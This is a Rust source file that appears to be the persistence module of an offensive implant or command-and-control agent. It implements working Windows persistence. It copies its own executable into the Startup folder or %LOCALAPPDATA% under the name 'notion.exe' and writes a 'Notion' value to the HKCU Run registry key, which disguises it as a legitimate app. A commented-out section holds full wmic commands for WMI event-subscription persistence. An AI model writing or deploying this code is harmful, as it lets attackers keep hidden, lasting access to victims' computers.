use std::error::Error;
#[cfg(windows)] use std::path::Path;
#[cfg(windows)] use winreg::{RegKey};
#[cfg(windows)] use std::env::{var};
#[cfg(windows)] use std::env::args;
#[cfg(windows)] use std::fs::copy as fs_copy;
#[cfg(windows)] use winreg::enums::HKEY_CURRENT_USER;

/// Uses the specified method to establish persistence. 
/// 
/// ### Windows Options
/// 
/// * `startup`: Copies the agent to the Startup Programs folder.
/// * `registry`: Copies the agent to `%LOCALAPPDATA%` and writes a value to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.
/// * `wmic`: Establishes persistences via WMI subscriptions.
/// 
/// ### Linux Options
/// 
/// * `cron`: Writes a cronjob to the user's crontab and saves the agent in the home folder
/// * `systemd`: Creates a systemd service and writes the binary someplace special
pub async fn handle(s: &String) -> Result<String, Box<dyn Error>> {
    // `persist [method] [args]`
    #[cfg(windows)] {
        match s.trim() {
            "startup" => {
                // Get user
                if let Ok(v) = var("APPDATA") {
                    let mut persist_path: String = v;
                    persist_path.push_str(r"\Microsoft\Windows\Start Menu\Programs\Startup\notion.exe");
                    let exe_path = args().nth(0).unwrap();
                    println!("{exe_path}");
                    // let mut out_file = File::create(path).expect("Failed to create file");
                    match fs_copy(&exe_path, &persist_path) {
                        Ok(b)  => { return Ok(format!("{b} bytes written to {persist_path}").to_string());},
                        Err(e) => { return Ok(e.to_string())}
                    }
                } else {
                    return Ok("Couldn't get APPDATA location".to_string());
                };
            },
            "registry" => {
                if let Ok(v) = var("LOCALAPPDATA") {
                    let mut persist_path: String = v;
                    persist_path.push_str(r"\notion.exe");
                    let exe_path = args().nth(0).unwrap();
                    println!("{exe_path}");
                    // let mut out_file = File::create(path).expect("Failed to create file");
                    fs_copy(&exe_path, &persist_path)?;
                    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
                    let path = Path::new(r"Software\Microsoft\Windows\CurrentVersion\Run");
                    let (key, disp) = hkcu.create_subkey(&path)?;
                    match disp {
                        REG_CREATED_NEW_KEY => println!("A new key has been created"),
                        REG_OPENED_EXISTING_KEY => println!("An existing key has been opened"),
                    };
                    key.set_value("Notion", &persist_path)?;
                    Ok("Persistence accomplished".to_string())
                } else {
                    Ok("LOCALDATA undefined".to_string())
                }
            },
            "wmic" => {
                //Ref: https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/
                //With special thanks to: https://github.com/trickster0/OffensiveRust
                //OPSEC unsafe! Use with caution
                // under construction
                /*
    
                if let Ok(v) = var("LOCALAPPDATA") {
                let mut persist_path: String = v;
                persist_path.push_str(r"\notion.exe");
                let exe_path = args().nth(0).unwrap();
                println!("{exe_path}");
                // let mut out_file = File::create(path).expect("Failed to create file");
                fs_copy(&exe_path, &persist_path)?;
    
                // I basically hate this, but...
                
                let args1 = r##"/c wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="Notion", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"##;
                let args2 = format!(r##"/c wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="Notion", ExecutablePath="{persist_path}",CommandLineTemplate="{persist_path}"##);
                let args3 = r##"/c wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"Notion\"", Consumer="CommandLineEventConsumer.Name=\"Notion\"""##;
                
                let cmd1 =  { Command::new("cmd")
                        .args([args1])
                        .output()
                        .expect("failed to execute process");
                };
                let cmd2 =  { Command::new("cmd")
                        .args([args2])
                        .output()
                        .expect("failed to execute process");
                };
                let cmd3 =  { Command::new("cmd")
                        .args([args3])
                        .output()
                        .expect("failed to execute process")
                };
                */
                Ok("Under Construction".to_string())
                
            },
            _ => Ok("That's not a persistence method!".to_string())
        }
    }
    #[cfg(not(windows))] {
        Ok("Not implemented yet!".to_string())
    }
}